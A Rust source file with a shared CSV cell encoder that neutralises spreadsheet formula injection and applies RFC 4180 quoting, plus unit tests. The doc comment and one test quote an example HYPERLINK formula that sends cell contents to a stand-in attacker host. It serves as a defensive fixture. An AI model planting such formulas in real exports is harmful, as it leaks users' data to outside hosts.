//! One CSV cell encoder for every export (tasks, time reports, timesheets,
//! invoices, payroll). There used to be five private copies, none of which
//! defended against formula injection.

/// Encode a text value as a CSV cell.
///
/// * **Formula injection** (CWE-1236): a cell starting with `=`, `+`, `-`,
///   `@`, tab or carriage return is treated as a formula by Excel, LibreOffice
///   and Sheets. Every exported text field is user-controlled — a task title
///   like `=HYPERLINK("https://evil.example/?"&A1,"Click")` would run when a
///   lead or finance opens the export. Such cells get a leading `'`, which
///   spreadsheets display as plain text (OWASP's recommended neutraliser).
/// * **Quoting** (RFC 4180): cells containing `,`, `"`, CR or LF are quoted,
///   with `"` doubled.
///
/// Only for text fields — numeric columns are written directly, so a negative
/// amount is never prefixed.
pub fn escape(s: &str) -> String {
    let neutralised;
    let s = if s.starts_with(['=', '+', '-', '@', '\t', '\r']) {
        neutralised = format!("'{s}");
        neutralised.as_str()
    } else {
        s
    };
    if s.contains([',', '"', '\n', '\r']) {
        format!("\"{}\"", s.replace('"', "\"\""))
    } else {
        s.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_text_is_untouched() {
        assert_eq!(escape("Fix the login page"), "Fix the login page");
        assert_eq!(escape(""), "");
        assert_eq!(escape("a-b = c"), "a-b = c"); // triggers only at the start
    }

    #[test]
    fn rfc4180_quoting() {
        assert_eq!(escape("a,b"), "\"a,b\"");
        assert_eq!(escape("say \"hi\""), "\"say \"\"hi\"\"\"");
        assert_eq!(escape("line1\nline2"), "\"line1\nline2\"");
        assert_eq!(escape("cr\rhere"), "\"cr\rhere\"");
    }

    #[test]
    fn formulas_are_neutralised() {
        assert_eq!(escape("=1+1"), "'=1+1");
        assert_eq!(escape("+cmd"), "'+cmd");
        assert_eq!(escape("-2+3"), "'-2+3");
        assert_eq!(escape("@SUM(A1)"), "'@SUM(A1)");
        assert_eq!(escape("\t=x"), "'\t=x");
        // Neutralised AND quoted when it also needs quoting.
        assert_eq!(
            escape("=HYPERLINK(\"https://evil.example/?\"&A1,\"Click\")"),
            "\"'=HYPERLINK(\"\"https://evil.example/?\"\"&A1,\"\"Click\"\")\""
        );
        assert_eq!(escape("\r=x"), "\"'\r=x\"");
    }
}
